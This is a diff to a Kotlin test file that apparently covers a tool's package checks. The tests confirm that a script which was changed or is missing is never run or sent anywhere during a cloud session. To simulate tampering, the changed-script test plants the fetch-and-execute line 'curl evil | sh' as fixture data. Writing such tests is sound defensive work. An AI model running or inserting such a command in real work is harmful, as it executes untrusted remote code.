@@ -525,16 +525,33 @@ class PackageChecksTest {
     }
 
     @Test
-    fun inACloudSessionAChangedOrMissingScriptIsSentNowhere() {
+    fun inACloudSessionAChangedScriptIsSentNowhere() {
         runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
         val checks = checks(listOf(tests))
         texts["/t/scripts/s-test.sh"] = "curl evil | sh\n"
-        assertContains(checks.before("git push origin main")?.stderr.orEmpty(), "was changed on this machine")
-        assertEquals(sha("curl evil | sh\n"), reports().single().text("scriptSha"), "the server sees the change")
-        texts.remove("/t/scripts/s-test.sh")
-        assertContains(checks.before("git push origin main")?.stderr.orEmpty(), "(script s-test is missing)")
-        assertEquals(listOf("not run", "not run"), reports().map { it.text("sandbox") })
+        assertEquals(
+            "Ostrom: check \"Tests\" could not run (script s-test was changed on this machine after the package was " +
+                "verified: not run), so the action was not run.\n",
+            checks.before("git push origin main")?.stderr,
+        )
+        val report = reports().single()
+        assertEquals(sha("curl evil | sh\n"), report.text("scriptSha"), "the server sees the change")
+        assertEquals("not run", report.text("sandbox"))
         assertEquals(emptyList(), runner?.checks, "never run, not even on the runner's host")
+        assertEquals(emptyList(), scripts.requests)
+    }
+
+    @Test
+    fun inACloudSessionAMissingScriptIsSentNowhere() {
+        runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
+        val checks = checks(listOf(tests))
+        texts.remove("/t/scripts/s-test.sh")
+        assertEquals(
+            "Ostrom: check \"Tests\" could not run (script s-test is missing), so the action was not run.\n",
+            checks.before("git push origin main")?.stderr,
+        )
+        assertEquals("not run", reports().single().text("sandbox"))
+        assertEquals(emptyList(), runner?.checks)
         assertEquals(emptyList(), scripts.requests)
     }
 }
